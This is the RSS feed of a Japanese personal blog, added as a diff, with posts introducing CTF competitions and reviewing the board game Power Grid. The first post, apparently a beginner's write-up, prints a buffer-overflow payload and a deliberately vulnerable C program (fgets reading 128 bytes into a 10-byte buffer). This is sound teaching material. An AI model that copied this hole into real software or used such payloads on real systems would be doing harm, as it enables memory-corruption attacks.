+&lt;p&gt;最終的な攻撃パターンは以下のようになります。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ echo -e &#39;AAAAAAAAAAAAAA\x00\x70\x55\x56AAAA\x40\x54\x55\x56\x26\x56\x55\x56\x20\x70\x55\x56&#39; | ./a.out
+buffer: 0x56557020
+flag:first_pwnbuffer: 0x56557020
+zsh: done                echo -en  |
+zsh: segmentation fault  ./a.out
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;表示されましたね！&lt;/p&gt;
+
+&lt;p&gt;実行ファイルの元のプログラムを貼っておきます。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+char buffer[] = &amp;quot;flag:first_pwn&amp;quot;;
+
+void input() {
+  char local[10];
+  fgets(local, 128, stdin);
+}
+
+int main() {
+  printf(&amp;quot;buffer: 0x%x\n&amp;quot;, buffer);
+  input();
+
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;最後に&#34;&gt;最後に&lt;/h1&gt;
+
+&lt;p&gt;簡単な例題のはずがえらい時間がかかりました。pwnは慣れが必要なので数をこなす必要があるんでしょうね。&lt;/p&gt;
+
+&lt;p&gt;あと今回はechoでエクスプロイトコードを履いていますがいちいちこれを書くのは面倒でしょう。
+pwntoolというpythonのライブラリを使うと結構簡単になります。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Catch the Flag if You Can</title>
+      <link>http://vintersnow.github.io/post/catch_the_flag_if_you_can/</link>
+      <pubDate>Mon, 12 Dec 2016 12:52:43 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/catch_the_flag_if_you_can/</guid>
+      <description>
+
+&lt;h1 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h1&gt;
+
+&lt;p&gt;この記事は&lt;a href=&#34;http://qiita.com/advent-calendar/2016/eeic2&#34;&gt;eeic Adevent Calendar 2016 その２&lt;/a&gt;の１１日目です。&lt;/p&gt;
+
+&lt;p&gt;これはCTF歴数ヶ月のトーシロがCTFを知らない人に対して説明をする（ことを試みた）記事です。
+以下の構成となっています。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;第一部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can/&#34;&gt;CTFについて&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第二部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/&#34;&gt;はじめてのバイナリ解析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第三部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/&#34;&gt;SECCON2016 write up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;この記事は第一部です。（長くなったので分割しました。）&lt;/p&gt;
+
+&lt;p&gt;CTFとは&amp;rdquo;Capture The Flag&amp;rdquo;の略で、隠されたフラッグと呼ばれるものを何かしらの方法で習得するゲームです。&lt;/p&gt;
+
+&lt;p&gt;IT技術を使った謎解き、プログラミング、ハッキングなどの言葉を聞いて興味を惹かれた人読んでみると良いかもしれません。&lt;br /&gt;
+「ハッキングとか倫理に反する！」と思う方やウィザードの方はブラウザを閉じることをおすすめます。&lt;br /&gt;
+また時間の無い方も踏み入れないほうがいいかもしれません&amp;hellip; 気がつくと時間が解けていきます。&lt;/p&gt;
+
+&lt;p&gt;&amp;hellip;&lt;br /&gt;
+..&lt;br /&gt;
+.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-highlight&#34;&gt;.......................................................................
+:::: ##:::::&#39;##:&#39;########:&#39;##::::::::&#39;######:::&#39;#######::&#39;##::::&#39;##::::
+:::: ##:&#39;##: ##: ##.....:: ##:::::::&#39;##... ##:&#39;##.... ##: ###::&#39;###::::
+:::: ##: ##: ##: ##::::::: ##::::::: ##:::..:: ##:::: ##: ####&#39;####::::
+:::: ##: ##: ##: ######::: ##::::::: ##::::::: ##:::: ##: ## ### ##::::
+:::: ##: ##: ##: ##...:::: ##::::::: ##::::::: ##:::: ##: ##. #: ##::::
+:::: ##: ##: ##: ##::::::: ##::::::: ##::: ##: ##:::: ##: ##:.:: ##::::
+::::. ###. ###:: ########: ########:. ######::. #######:: ##:::: ##::::
+:::::...::...:::........::........:::......::::.......:::..:::::..:::::
+:::: ########::&#39;#######::::::::::::::::::::::::::::::::::::::::::::::::
+::::... ##..::&#39;##.... ##:::::::::::::::::::::::::::::::::::::::::::::::
+::::::: ##:::: ##:::: ##:::::::::::::::::::::::::::::::::::::::::::::::
+::::::: ##:::: ##:::: ##:::::::::::::::::::::::::::::::::::::::::::::::
+::::::: ##:::: ##:::: ##:::::::::::::::::::::::::::::::::::::::::::::::
+::::::: ##:::: ##:::: ##:::::::::::::::::::::::::::::::::::::::::::::::
+::::::: ##::::. #######::::::::::::::::::::::::::::::::::::::::::::::::
+:::::::..::::::.......:::::::::::::::::::::::::::::::::::::::::::::::::
+:::: ##::::&#39;##:&#39;##::: ##:&#39;########::&#39;########:&#39;########::::::::::::::::
+:::: ##:::: ##: ###:: ##: ##.... ##: ##.....:: ##.... ##:::::::::::::::
+:::: ##:::: ##: ####: ##: ##:::: ##: ##::::::: ##:::: ##:::::::::::::::
+:::: ##:::: ##: ## ## ##: ##:::: ##: ######::: ########::&#39;#######::::::
+:::: ##:::: ##: ##. ####: ##:::: ##: ##...:::: ##.. ##:::........::::::
+:::: ##:::: ##: ##:. ###: ##:::: ##: ##::::::: ##::. ##::::::::::::::::
+::::. #######:: ##::. ##: ########:: ########: ##:::. ##:::::::::::::::
+:::::.......:::..::::..::........:::........::..:::::..::::::::::::::::
+::::: ######::: ########:::&#39;#######::&#39;##::::&#39;##:&#39;##::: ##:&#39;########::::
+:::: ##... ##:: ##.... ##:&#39;##.... ##: ##:::: ##: ###:: ##: ##.... ##:::
+:::: ##:::..::: ##:::: ##: ##:::: ##: ##:::: ##: ####: ##: ##:::: ##:::
+:::: ##::&#39;####: ########:: ##:::: ##: ##:::: ##: ## ## ##: ##:::: ##:::
+:::: ##::: ##:: ##.. ##::: ##:::: ##: ##:::: ##: ##. ####: ##:::: ##:::
+:::: ##::: ##:: ##::. ##:: ##:::: ##: ##:::: ##: ##:. ###: ##:::: ##:::
+::::. ######::: ##:::. ##:. #######::. #######:: ##::. ##: ########::::
+:::::......::::..:::::..:::.......::::.......:::..::::..::........:::::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;about-ctf&#34;&gt;What is CTF?&lt;/h1&gt;
+
+&lt;p&gt;すでに述べましたが、CTF(Capture The Flag)は隠されたフラッグを探し出すゲームです。
+CTFは様々な知識を必要とするので、 CTFを行うことでITの基盤技術全般が身につきます！&lt;/p&gt;
+
+&lt;p&gt;出段範囲が広すぎて一概には言えないのですが、主に下記のような問題が出題されます。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;バイナリ解析&lt;/li&gt;
+&lt;li&gt;ネットワーク通信&lt;/li&gt;
+&lt;li&gt;Web&lt;/li&gt;
+&lt;li&gt;暗号&lt;/li&gt;
+&lt;li&gt;プログラミング&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;そして以下のような知識が必要となります&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;プログラミング&lt;/li&gt;
+&lt;li&gt;データベース&lt;/li&gt;
+&lt;li&gt;無線通信&lt;/li&gt;
+&lt;li&gt;符号理論&lt;/li&gt;
+&lt;li&gt;暗号理論&lt;/li&gt;
+&lt;li&gt;OSなどの基本的な知識
+
+&lt;ul&gt;
+&lt;li&gt;システムコール&lt;/li&gt;
+&lt;li&gt;ファイルシステム&lt;/li&gt;
+&lt;li&gt;メモリダンプ&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;雑学&lt;/li&gt;
+&lt;li&gt;etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;とまあテストの出題範囲だったらブチ切れる広さをしています。
+基本的に調べながらやることになります。
+一問解くのに時間がかかりますが、とても勉強になります。&lt;/p&gt;
+
+&lt;p&gt;イメージしやすくするためどのような問題がでるのか例を出しましょう&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Decode this!
+&amp;ldquo;synt:guvf_vf_Pnrfne_pvcure&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;問題文に&amp;rdquo;復号せよ&amp;rdquo;と書かれていて、暗号文らしいものが書かれています。&lt;br /&gt;
+なんの暗号でしょうか？少し考えてください。&lt;/p&gt;
+
+&lt;p&gt;&lt;br&gt; &lt;br&gt; &lt;br&gt;
+&lt;code&gt;......&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;.....&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;....&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;...&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;.&lt;/code&gt;&lt;br /&gt;
+&lt;br&gt; &lt;br&gt; &lt;br&gt;&lt;/p&gt;
+
+&lt;p&gt;わかりましたか？
+これはシーザー暗号もしくはrot13と呼ばれる単一換字式暗号です。アルファベットを13文字ずらしたものに置き換えている暗号です。
+復号してみましょう&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;quot;synt:guvf_vf_Pnrfne_pvcure&amp;quot;.decode(&amp;quot;rot13&amp;quot;)
+# =&amp;gt; u&#39;flag:this_is_Caesar_cipher&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;フラッグが手に入りましたね！&lt;/p&gt;
+
+&lt;p&gt;実際はもっと難しいですが、大体これの延長線上です。たぶん&amp;hellip;&lt;/p&gt;
+
+&lt;h1 id=&#34;ctfの始め方&#34;&gt;CTFの始め方&lt;/h1&gt;
+
+&lt;h2 id=&#34;大会&#34;&gt;大会&lt;/h2&gt;
+
+&lt;p&gt;CTFは本来は大会です。チーム(ひとりでもok)で参加し、時間内（24時間や48時間）にどれだけのflagを取れるかを競います。
+有名なものではDEFCONやSECCONなどがあります。ちょうどこの土日にSECCON2016がありました。&lt;br /&gt;
+大会といっても大抵オンラインで参加できるで、とりあえず応募して時間があったら問題見てみるというスタイルでいいと思います。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://ctftime.org/&#34;&gt;CTFTime&lt;/a&gt;というサイトで開催予定の大会を知ることが出来ます。&lt;/p&gt;
+
+&lt;p&gt;大会と違って常設のCTFというのもあります。これはいつでも自分の好きな時に試すことが出来ます。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://ksnctf.sweetduet.info/&#34;&gt;ksnctf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://overthewire.org/wargames/&#34;&gt;OverTheWiro&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;自分はksnctfしかしたことないのですが日本のサイトですしおすすめです。
+OverTheWiroは試したことないのですが初心者向けらしいので試してみたいですね。&lt;/p&gt;
+
+&lt;p&gt;CTFでは問題を解くとwrite upと言ってどのように解いたのか書く習慣があります。解けた問題も解けなかった問題も他人のwrite upを読むのは勉強になるので大会後はwrite upを探すと良いです。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考書&#34;&gt;参考書&lt;/h2&gt;
+
+&lt;p&gt;ネットで調べてるだけでも問題ないのですが、さすがに基礎知識がないとそもそも取っ掛かりすら分からなかったりするので、
+自分は&lt;a href=&#34;https://www.amazon.co.jp/dp/4839956480/ref=sr_1_1?ie=UTF8&amp;amp;qid=1481523754&amp;amp;sr=8-1&#34;&gt;セキュリティコンテストチャレンジブック&lt;/a&gt;という本で勉強中です。CTF初心者向けの本です。&lt;/p&gt;
+
+&lt;p&gt;他に、「秘密の国のアリス」や「Hacking: 美しき策謀」も良い本らしいです。&lt;/p&gt;
+
+&lt;h2 id=&#34;まとめ&#34;&gt;まとめ&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;CTFは勉強になるのでおすすめ。&lt;/li&gt;
+&lt;li&gt;とりあえずいっぺん試してみよう。&lt;/li&gt;
+&lt;li&gt;CTF仲間募集しています。&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Catch the Flag if You Can</title>
+      <link>http://vintersnow.github.io/post/catch_the_flag_if_you_can_dummy/</link>
+      <pubDate>Sun, 11 Dec 2016 20:35:02 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/catch_the_flag_if_you_can_dummy/</guid>
+      <description>
+
+&lt;pre&gt;&lt;code&gt;                                    
+      ∧＿∧  やあ                    
+     （´・ω・｀)            /      
+    ／∇y:::::::＼      [￣￣]       
+    |:::⊃:|::::::|     |────| 
+￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣| 
+￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|￣￣ 
+￣￣￣￣￣￣￣￣￣￣￣￣￣￣／|     
+        ∇  ∇  ∇  ∇          ／.／|
+        ┴  ┴  ┴  ┴         ／ ／.|
+￣￣￣￣￣￣￣￣￣￣￣￣|／      |   
+￣￣￣￣￣￣￣￣￣￣￣￣         |  
+       (⊆⊇)    (⊆⊇)    (⊆⊇)      |  
+        ||      ||     .||    
+      .／|＼   ／|＼   ／|＼        
+
+　　　　　　ようこそ、アドベントカレンダーへ。
+　　　　このテキーラはサービスだから、
+　　　　　　　 まず飲んで落ち着いて欲しい。
+ 　　　　　　うん、「また」なんだ。済まない。
+  　　 　　　　仏の顔もって言うしね、
+ 謝って許してもらおうとも思っていない。
+ 
+　でも、この記事を見たとき、君は、
+　　　きっと言葉では言い表せない
+　　　「ときめき」みたいなものを
+　感じてくれたと思う。殺伐とした世の中で、
+　　そういう気持ちを忘れないで欲しい
+　　そう思って、この記事を投稿したんだ。
+　　　　　|　　　
+　　　　　 じゃあ、注文を聞こうか。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;明日には-明日には-書きます&#34;&gt;明日には、明日には、書きます。&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can/&#34;&gt;書きました&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>重ゲーのススメ</title>
+      <link>http://vintersnow.github.io/post/boardgame_advent_2016/</link>
+      <pubDate>Mon, 05 Dec 2016 14:14:54 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/boardgame_advent_2016/</guid>
+      <description>
+
+&lt;p&gt;この記事は&lt;a href=&#34;http://www.adventar.org/calendars/1765&#34;&gt;ボドゲ紹介02 Advent Calendar 2016&lt;/a&gt;の５日めです。&lt;/p&gt;
+
+&lt;h1 id=&#34;はじめに&#34;&gt;はじめに&lt;/h1&gt;
+
+&lt;p&gt;みなさん普段どんなボドゲをしていますか？&lt;br /&gt;
+対戦が好きな人、協力が好きな人、アブストが好きな人、トリテしかしない人などなど、様々だと思います。&lt;/p&gt;
+
+&lt;p&gt;そういうジャンルとは別に重ゲーと呼ばれる種類があります。見ての通り時間的に、ルール的に重いゲームです。&lt;/p&gt;
+
+&lt;p&gt;短時間でできるゲームと違い、あまりする機会がなく悲しいのでこの場で広めれたらなと思います。&lt;/p&gt;
+
+&lt;h1 id=&#34;電力会社&#34;&gt;電力会社&lt;/h1&gt;
+
+&lt;p&gt;最初に紹介する重ゲーは「電力会社」とものです。2004年に発売された古いゲームですが、根強い人気があり今でも拡張や新板が出たりしています。
+僕が持っているのは&lt;a href=&#34;https://www.amazon.co.jp/dp/B00PBVL624/ref=sr_1_1?s=toys&amp;amp;ie=UTF8&amp;amp;qid=1480915968&amp;amp;sr=1-1&amp;amp;keywords=%E9%9B%BB%E5%8A%9B%E4%BC%9A%E7%A4%BE&#34;&gt;「新電力会社デラックス 完全日本語版」&lt;/a&gt;です。
+なにが「新」で、どう「デラックス」なのが知りませんが…&lt;/p&gt;
+
+&lt;h2 id=&#34;ゲームの目的&#34;&gt;ゲームの目的&lt;/h2&gt;
+
+&lt;p&gt;各プレイヤーは電力会社の経営者となり北米（もしくは欧州）に発電所を都市に立てていきます。
+発電をして都市に給電するとお金がもらえ、お金を使って事業を発展させていきます。
+最終的に一番多くの都市に給電出来たプレイヤーが勝者となります。&lt;/p&gt;
+
+&lt;p&gt;これだけ書くとよくある拡大再生産系のゲームです。&lt;/p&gt;
+
+&lt;h2 id=&#34;ルールの概要&#34;&gt;ルールの概要&lt;/h2&gt;
+
+&lt;p&gt;（注:大体の流れが分かるように重要なところだけ説明しているので完全なルールではありません。）&lt;/p&gt;
+
+&lt;h3 id=&#34;ステージ-ラウンド-フェーズ&#34;&gt;ステージ、ラウンド、フェーズ&lt;/h3&gt;
+
+&lt;p&gt;このゲームは3ステージからなり、各ステージは複数回のラウンドからなります。
+各ラウンドは5つのフェーズがあり、各フェーズを全てのプレイヤーが順番に行います。&lt;/p&gt;
+
+&lt;p&gt;フェーズは以下の5つです。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;順番決定&lt;/li&gt;
+&lt;li&gt;発電所オークション&lt;/li&gt;
+&lt;li&gt;資源購入&lt;/li&gt;
+&lt;li&gt;建設&lt;/li&gt;
+&lt;li&gt;管理&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;発電所オークション-フェーズ&#34;&gt;発電所オークション フェーズ&lt;/h3&gt;
+
+&lt;p&gt;担当プレイヤーが上段の発電所のうち一つを選んでオークションを行います。
+入札後新たに発電所の山札から一枚補充します。このとき順番は発電所の番号（価値）の順に並べ替えます。（なのでオークションでは見えている８枚のうち価値の低い４枚が入札できます）&lt;/p&gt;
+
+&lt;p&gt;この発電所によって、&lt;code&gt;発電に必要な資源の種類と量&lt;/code&gt;と&lt;code&gt;発電したとき給電できる都市の数&lt;/code&gt;が違います。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/images/game/dg_auction.jpg&#34; alt=&#34;重ゲーのススメ images/game/dg_auction.jpg&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;h3 id=&#34;資源購入-フェーズ&#34;&gt;資源購入 フェーズ&lt;/h3&gt;
+
+&lt;p&gt;発電所に必要な資源を順番に購入します。このとき順番は以前の逆になります。
+また、資源は発電所が消費出来る資源の２倍までしかストックできません。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;資源の値段&lt;/strong&gt;は市場によって決まります。資源が枯渇すると高くなり、余ると安くなります。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/images/game/dg_resources.jpg&#34; alt=&#34;重ゲーのススメ images/game/dg_resources.jpg&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;p&gt;この写真の場合、石炭2、天然ガス3、石油3、ウラン1です。&lt;/p&gt;
+
+&lt;h3 id=&#34;建設-フェーズ&#34;&gt;建設 フェーズ&lt;/h3&gt;
+
+&lt;p&gt;盤面の都市に発電機を&lt;strong&gt;お金を払って&lt;/strong&gt;設置できます。この時以下のルールが適用されます。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;自分の発電機がある都市と隣接していないといけない。&lt;/li&gt;
+&lt;li&gt;同じ都市には同じプレイヤーは２つおけない。&lt;/li&gt;
+&lt;li&gt;都市における発電機の数は上限がある。(３ないし６)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;建設にかかるコストは&lt;code&gt;都市に建てるコスト&lt;/code&gt;+&lt;code&gt;電力網の接続コスト&lt;/code&gt;です。盤面の都市と都市を繋いでいる管に書いてある数字が接続コストです。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/images/game/dg_city.jpg&#34; alt=&#34;重ゲーのススメ images/game/dg_city.jpg&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;h3 id=&#34;管理&#34;&gt;管理&lt;/h3&gt;
+
+&lt;p&gt;以下のことをします。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;発電による収入&lt;/li&gt;
+&lt;li&gt;資源の補充&lt;/li&gt;
+&lt;li&gt;発電所の更新&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;発電は発電所から資源を取り除き、都市に給電します。もし給電できる都市がなければ、その電力は無駄になります。&lt;/p&gt;
+
+&lt;h2 id=&#34;重ゲーポイント&#34;&gt;重ゲーポイント&lt;/h2&gt;
+
+&lt;h3 id=&#34;ほぼ完全情報ゲーム&#34;&gt;ほぼ完全情報ゲーム&lt;/h3&gt;
+
+&lt;p&gt;発電所の出現だけはランダムですが、プレイヤーが持つ全ての情報は公開情報です。考えれる情報があるということはそれだけ考える時間が延びるということです。
+また、同じ状態というのが基本的にありません。プレイする順番によって資源の値段も建設コストもまるっきり変わってきます。&lt;/p&gt;
+
+&lt;h3 id=&#34;パラメーターの数&#34;&gt;パラメーターの数&lt;/h3&gt;
+
+&lt;p&gt;大抵考えないないといけないパラメーターが増えるとそれだけ複雑になり重ゲーになります。&lt;/p&gt;
+
+&lt;p&gt;この電力会社だと、以下のパラメーターがあります。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;お金&lt;/li&gt;
+&lt;li&gt;資源&lt;/li&gt;
+&lt;li&gt;都市&lt;/li&gt;
+&lt;li&gt;発電所&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;資源を買うのにお金が必要。都市に発電機を置くのにお金必要。発電所を買うのにお金が必要。そしてお金を稼ぐには資源と発電機と発電所が必要です。
+またお金を稼げるのはラウンドの最後だけなので、次のラウンドで必要になるお金を稼ぐために必要となるお金を稼ぐための&amp;hellip;みたいなことになります。&lt;/p&gt;
+
+&lt;p&gt;あと単純に足し算を間違います。最終的に３桁程度のお金が１ラウンド必要になってくるので。&lt;/p&gt;
+
+&lt;h3 id=&#34;対人要素&#34;&gt;対人要素&lt;/h3&gt;
+
+&lt;p&gt;この電力会社というゲームは自分が行うあらゆる行動が他人に影響します。
+建てようと思っていたところに発電機を建てられ、進路を封鎖され、資源は買い占められ、発電所は競り上げられます。
+全うなプレイングをすると他人のヘイトを集め、一人抜きん出ると他のプレイヤーが徒党を組んで邪魔をしてきます。
+全くもって素晴らしいゲームです。&lt;/p&gt;
+
+&lt;p&gt;特に終盤なんかは特定のプレイヤーの勝利が見えてくるので、他のプレイヤーはいかに場をかき乱すか堂々と相談始めたりします。（???「私は勝てないが、誰を勝つかは決めれる」）&lt;br /&gt;
+なので、自分がいかに厳しく邪魔する必要がないか、相手方がどれだけに有利か主張しつつ、勝ちまでを読んでいきます。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/images/neta/habu.jpg&#34; alt=&#34;重ゲーのススメ images/neta/habu.jpg&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;h1 id=&#34;最後に&#34;&gt;最後に&lt;/h1&gt;
+
+&lt;p&gt;このゲームを最初にプレイした時はインストを含め６時間かかった覚えがあります。（確か５人プレイだったと思う）。&lt;br /&gt;
+本当はテラミスティカという傑作も重ゲーも紹介したかったのですが…&lt;/p&gt;
+
+&lt;p&gt;他に気になっているゲームに以下のものがあります。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;トワイライトストラグル&lt;/li&gt;
+&lt;li&gt;スルー・ジ・エイジズ&lt;/li&gt;
+&lt;li&gt;ディプロマシー&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;買いたい！（お金がない）
+したい！（する時間がない）&lt;/p&gt;
+
+&lt;p&gt;重ゲーは時間やメンツの都合上あまりする機会がなく、特に最近はボドゲ自体をやっていないのでそろそろ禁断症状が出てきそうです。&lt;br /&gt;
+気軽に参加できるボドゲ会などがあったら教えてください。（別に重ゲーじゃなくてもいいです^ ^）&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
